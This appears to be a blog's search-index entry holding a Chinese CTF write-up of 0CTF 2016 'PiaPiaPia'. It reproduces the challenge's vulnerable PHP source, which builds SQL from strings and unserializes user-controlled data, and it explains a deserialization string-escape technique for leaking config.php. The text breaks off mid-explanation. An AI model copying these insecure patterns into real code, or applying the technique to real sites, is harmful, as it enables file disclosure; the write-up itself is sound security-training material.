<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>0CTF:2016-PiaPiaPia</title>
    <url>/2021/07/12/0ctf-2016-piapiapia/</url>
    <content><![CDATA[<p>扫描到了<a href="http://www.zip下载下来/">www.zip下载下来</a></p>
<p><img src="/2021/07/12/0ctf-2016-piapiapia/image-20210711221607725.png" alt="image-20210711221607725"></p>
<p>register-&gt;login-&gt;update-&gt;profile</p>
<p><strong>config.php</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'hostname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">;</span>
    <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'root'</span><span class="token punctuation">;</span>
    <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p><strong>update.php</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Login First'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^\d{11}$/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Invalid phone'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Invalid email'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[^a-zA-Z0-9_]/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Invalid nickname'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'size'</span><span class="token punctuation">]</span> <span class="token markup">&lt; 5 or $file['size'] ></span> <span class="token number">1000000</span><span class="token punctuation">)</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Photo size error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'upload/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'photo'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'upload/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">update_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string">'Update Profile Success!&lt;a href="profile.php">Your Profile&lt;/a>'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
<span class="token delimiter">?></span></code></pre>
<p><strong>class.php</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">user</span> <span class="token keyword">extends</span> <span class="token class-name">mysql</span><span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string">'users'</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">is_exists</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string">"username = '$username'"</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$key_list</span> <span class="token operator">=</span> <span class="token keyword">Array</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$value_list</span> <span class="token operator">=</span> <span class="token keyword">Array</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token variable">$key_list</span><span class="token punctuation">,</span> <span class="token variable">$value_list</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string">"username = '$username'"</span><span class="token punctuation">;</span>
        <span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$object</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$object</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">show_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string">"username = '$username'"</span><span class="token punctuation">;</span>
        <span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$object</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">profile</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$new_profile</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$new_profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string">"username = '$username'"</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token string">'profile'</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> __class__<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">mysql</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">link</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span>
            <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'hostname'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
            <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string">"SET sql_mode='strict_all_tables'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">link</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">,</span> <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token string">'*'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT $ret FROM $table WHERE $where"</span><span class="token punctuation">;</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">mysql_fetch_object</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">insert</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token variable">$key_list</span><span class="token punctuation">,</span> <span class="token variable">$value_list</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token variable">$key_list</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string">'\''</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'\',\''</span><span class="token punctuation">,</span> <span class="token variable">$value_list</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'\''</span><span class="token punctuation">;</span> 
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"INSERT INTO $table ($key) VALUES ($value)"</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"UPDATE $table SET $key = '$value' WHERE $where"</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'\\\\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$escape</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/'</span><span class="token punctuation">;</span>
        <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$escape</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'select'</span><span class="token punctuation">,</span> <span class="token string">'insert'</span><span class="token punctuation">,</span> <span class="token string">'update'</span><span class="token punctuation">,</span> <span class="token string">'delete'</span><span class="token punctuation">,</span> <span class="token string">'where'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$safe</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/i'</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$safe</span><span class="token punctuation">,</span> <span class="token string">'hacker'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> __class__<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p><strong>profile.php</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Login First'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token punctuation">}</span>
    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$profile</span><span class="token operator">=</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">show_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$profile</span>  <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: update.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token variable">$profile</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$photo</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p><strong>index.php&amp;register.php</strong></p>
<p><img src="/2021/07/12/0ctf-2016-piapiapia/image-20210711231343553.png" alt="image-20210711231343553"></p>
<p> <strong>$profile[‘photo’]的值为“config.php”</strong>就可以得到flag.php</p>
<h3 id="反序列化字符逃逸知识补充"><a href="#反序列化字符逃逸知识补充" class="headerlink" title="反序列化字符逃逸知识补充"></a>反序列化字符逃逸知识补充</h3><ul>
<li>PHP反序列化字符逃逸<br> 举个小例子<br> 序列化</li>
</ul>
<pre><code>&lt;?php
$a = array('123', 'abc', 'defg');
var_dump(serialize($a));
?&gt;</code></pre>
<p>结果</p>
<pre><code>string(49) "a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:4:"defg";}" </code></pre>
<p>反序列化</p>
<pre><code>&lt;?php
//$a = array('123', 'abc', 'defg');
//var_dump(serialize($a));
//"a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:4:"defg";}"
$b = 'a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:4:"defg";}';
var_dump(unserialize($b));
?&gt;</code></pre>
<p>运行结果</p>
<pre><code>array(3) { [0]=&gt; string(3) "123" [1]=&gt; string(3) "abc" [2]=&gt; string(4) "defg" } </code></pre>
<p>  我们可以看到在后端中，反序列化是一”;}结束的，如果我们把”;}带入需要反序列化的字符串中（除了结尾处），是不是就能让反序列化提前结束后面的内容就丢弃了呢？<br>  我们把第二个值abc换成abc”;i:2;s:5:”qwert”;}</p>
<pre><code>&lt;?php
//$a = array('123', 'abc', 'defg');
//var_dump(serialize($a));
//"a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:4:"defg";}"
$b = 'a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:5:"qwert";}";i:2;s:4:"defg";}';
var_dump(unserialize($b));
?&gt;</code></pre>
<p>运行结果</p>
<pre><code>array(3) { [0]=&gt; string(3) "123" [1]=&gt; string(3) "abc" [2]=&gt; string(5) "qwert" } </code></pre>
<p>成功的反序列化出我们自己定义的内容，丢弃了原先的内容（i:2;s:4:”defg”）<br> 反序列化字符逃逸就先介绍到这里，我们回过头来看一下题</p>
<ul>
<li>突破口<br> 我们发现一个问题，我们反序列化字符逃逸，首先序列化的字符是可控的，还有前面的长度是可控的。但update.php将参数序列化，我们可控变量的长度就已经写死了，怎么才能去控制呢。这道题的突破口其实就是序列化过后数据过滤替换那里，看似更加安全，其实更加危险。</li>
</ul>
<pre><code>//过滤函数
    public function filter($string) {
        $escape = array('\'', '\\\\');
        $escape = '/' . implode('|', $escape) . '/';
        $string = preg_replace($escape, '_', $string);

        $safe = array('select', 'insert', 'update', 'delete', 'where');
        $safe = '/' . implode('|', $safe) . '/i';
        return preg_replace($safe, 'hacker', $string);
    }</code></pre>
<p>  这里是将’select’, ‘insert’, ‘update’, ‘delete’,  ‘where’替换成’hacker’，我们写入where替换成hacker之后字符串实际的长度就+1，因此实际的长度大于序列化固定的长度（变量前面‘s’里的值）。利用反序列化字符串逃逸，反序列化时只能将字符串中nickname前面的s后面长度的字符串反序列化成功，这个是传参的时候就固定好了。剩下的字符串我们构造成class.php因为里面包含了flag，并且让他在photo位置上，然后把photo给扔掉，这样在profile.php中读取的photo就是我们构造的config.php了，也就是读取到了flag<br>  简单说就是利用后端的函数替换，导致实际长度增加，增加的部分（config.php）被挤了出来，到了photo的位置上，然后闭合。<br>  再举个例方便大家理解</p>
<pre><code>&lt;?php
//$a = array('123', 'abc', 'defg');
//var_dump(serialize($a));
//"a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:4:"defg";}"
$a = 'a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:4:"defg";}';
$b = 'a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:5:"qwert";}";i:2;s:4:"defg";}';
var_dump(unserialize($b));
var_dump(unserialize($b));
?&gt;</code></pre>
